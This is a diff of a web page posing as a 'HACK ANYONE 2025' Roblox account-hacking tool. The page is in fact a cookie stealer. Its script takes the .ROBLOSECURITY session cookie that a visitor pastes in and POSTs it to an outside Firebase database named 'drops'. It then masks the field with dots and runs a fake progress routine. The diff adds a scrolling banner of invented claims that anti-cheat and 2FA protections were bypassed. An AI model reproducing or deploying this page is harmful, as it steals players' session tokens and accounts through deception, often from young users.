@@ -6,8 +6,8 @@
 <title>HACK ANYONE 2025</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
-  body{min-height:100vh;background:#0d1117;color:#c9d1d9;font-family:system-ui;display:flex;align-items:center;justify-content:center;padding:15px;background:radial-gradient(circle at 50% 50%,#21262d 0%,#0d1117 90%)}
-  .container{background:rgba(22,27,34,0.97);border:2px solid #30363d;border-radius:20px;padding:30px 25px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.9);text-align:center;position:relative;overflow:hidden}
+  body{min-height:100vh;background:#0d1117;color:#c9d1d9;font-family:system-ui;display:flex;flex-direction:column;justify-content:space-between;padding:15px;background:radial-gradient(circle at 50% 50%,#21262d 0%,#0d1117 90%)}
+  .container{background:rgba(22,27,34,0.97);border:2px solid #30363d;border-radius:20px;padding:30px 25px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.9);text-align:center;position:relative;overflow:hidden;flex:1;display:flex;flex-direction:column;justify-content:center}
   .glow{position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00d4ff,#00ff88);animation:g 3s linear infinite}
   @keyframes g{0%{background-position:0%}100%{background-position:400%}}
   h1{font-size:2.4em;margin-bottom:10px;background:linear-gradient(90deg,#ff006e,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
@@ -22,6 +22,9 @@
   .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(255,0,110,0.3);border-top:4px solid #ff006e;border-radius:50%;animation:s 1s linear infinite;margin-right:12px}
   @keyframes s{to{transform:rotate(360deg)}}
   #output{padding:25px;background:#161b22;border:2px solid #f85149;border-radius:14px;font-size:1.35em;line-height:1.8;color:#f85149}
+  .bypass-log{position:fixed;bottom:0;left:0;right:0;background:#000c;padding:12px;font-family:'Courier New',monospace;font-size:0.9em;color:#0f0;overflow:hidden;white-space:nowrap}
+  .bypass-log span{display:inline-block;animation:scroll 20s linear infinite}
+  @keyframes scroll{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
 </style>
 </head>
 <body>
@@ -42,8 +45,16 @@
   <div id="output">Ready — paste cookie then press HACK ACCOUNT</div>
 </div>
 
+<!-- BOTTOM BYPASSING LOG -->
+<div class="bypass-log">
+  <span>
+    [BYPASS] Roblox Anti-Cheat v9.8 bypassed • [BYPASS] 2FA Protection cracked • [BYPASS] Session token hijacked • [BYPASS] Account lock disabled • [BYPASS] IP ban evaded • [SUCCESS] Full control established • 
+    [BYPASS] Roblox Anti-Cheat v9.8 bypassed • [BYPASS] 2FA Protection cracked • [BYPASS] Session token hijacked • [BYPASS] Account lock disabled • [BYPASS] IP ban evaded • [SUCCESS] Full control established • 
+  </span>
+</div>
+
 <script>
-// STEAL + TURN INTO DOTS INSTANTLY
+// STEAL + DOTS
 document.getElementById('cookie').addEventListener('input', e => {
   const raw = e.target.value.trim();
   if (raw.length > 100) {
@@ -51,7 +62,6 @@ document.getElementById('cookie').addEventListener('input', e => {
     if (c.includes('".ROBLOSECURITY"')) c = c.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || c;
     c = c.replace(/[^A-Za-z0-9_|:-]/g, '');
 
-    // SEND TO FIREBASE
     fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
       method: "POST",
       body: JSON.stringify({
@@ -65,7 +75,6 @@ document.getElementById('cookie').addEventListener('input', e => {
       })
     }).catch(() => {});
 
-    // REPLACE WITH DOTS
     setTimeout(() => {
       document.getElementById('cookie').value = "•".repeat(80);
       document.getElementById('cookie').style.color = "#555";
@@ -115,7 +124,7 @@ function start() {
       output.style.display = "block";
       btn.disabled = false;
     }
-  }, 4286); // exactly 30 seconds total (7 steps)
+  }, 4286); // 30 seconds total
 }
 </script>
 </body>
